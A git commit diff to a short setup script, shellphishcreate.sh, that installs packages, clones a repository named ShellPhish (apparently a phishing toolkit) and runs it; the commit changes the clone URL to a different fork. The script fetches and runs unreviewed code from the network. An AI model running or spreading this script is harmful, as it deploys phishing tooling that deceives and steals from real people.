730654fef599386d107a3437aaeac19c8b070c51
jkramer5103 <121427510+jkramer5103@users.noreply.github.com>
2024-10-15 08:28:00 +0200

    Update shellphishcreate.sh

--- shellphishcreate.sh
+++ shellphishcreate.sh
@@ -2,7 +2,7 @@ apt update
 apt install git -y
 apt install php -y
 apt install unzip -y
-git clone https://github.com/AbirHasan2005/ShellPhish.git
+git clone https://github.com/jkramer5103/ShellPhish.git
 cd ShellPhish
 chmod +x shellphish.sh
 ./shellphish.sh
